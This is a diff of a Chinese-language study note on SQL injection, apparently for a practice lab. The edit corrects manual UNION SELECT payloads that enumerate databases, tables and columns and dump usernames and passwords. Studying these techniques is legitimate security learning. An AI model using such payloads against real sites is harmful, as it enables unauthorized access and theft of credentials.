@@ -59,9 +59,9 @@ SQL注入是学习过程中第一个接触的漏洞，也是应用比较广泛�
 
 `id=-1' union select 1,2,3 --+ `
 
-`id=-1 union select 1,group_concat(schema_name),3 from information_schema.shcemata --+ `
+`id=-1' union select 1,group_concat(schema_name),3 from information_schema.shcemata --+ `
 
-`id=-1 union select 1,database(),3 from information_schema.shcemata --+ `
+`id=-1' union select 1,database(),3 from information_schema.shcemata --+ `
 
 `id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = "security" --+ `
 
@@ -149,10 +149,10 @@ MySQL 的报错格式是：... right syntax to use near '<出错的SQL片段>' a
 #### (2) 掌握手工注入的办法(os:如果你没有sqlmap工具，你要怎么发起攻击呢...?)
 ##### 1. 列字段检测
 
-`order by n`
+`' order by n`
 
 ##### 2. 手工注入
-采用`union select`联合注入法
+###### 采用`union select`联合注入法
 
 原理: 在url语句中已经使用了`'`或者其他的字段闭合了前一个sql语句，后面接`union select`表示继续执行下一个查询语句
 
@@ -164,27 +164,34 @@ MySQL 的报错格式是：... right syntax to use near '<出错的SQL片段>' a
 
 2. 查询数据库:
 
-`id=-1 ' union select 1,group_concat(schema_name),3 from information_schema.schemata --+`
+`id=-1' union select 1,group_concat(schema_name),3 from information_schema.schemata --+`
 
 补充: 除了这样查询之外，还可以传入其他你想查询的内容
 
-`id=-1 union select 1,database(),3 from information_schema.shcemata --+ ` 
+`id=-1' union select 1,database(),3 from information_schema.shcemata --+ ` 
 
 3. 查询指定数据库中的数据表
 
-`id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = "数据库名字 --+ "` 
+`id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = "数据库名字 --+ "` 
 
 4. 查询指定数据表中的字段
 
-`id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name = "表单名" --+ `
+`id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name = "表单名" --+ `
 
 5. 查询指定字段中的数据
 
-`id=-1 union select 1,group_concat(id,username,password),3 from 表单名`
+`id=-1' union select 1,group_concat(id,username,password),3 from 表单名`
 
 这里值得提出强调的是`语句4`和`语句5`,同样是表单名为什么`语句4`要用双引号，而`语句5`不用?
 
 答案在于 在`语句4`中，表单名作为一个字符串被赋给table_name，而在`语句5`中，表单名本身作为sql语句中的变量参与进语句中。
+
+###### 另外一些注入的内容
+对mysql版本进行尝试
+
+`id=1' `
+
+
 
 ## SQL数据库的补充知识
 一 基础字符部分
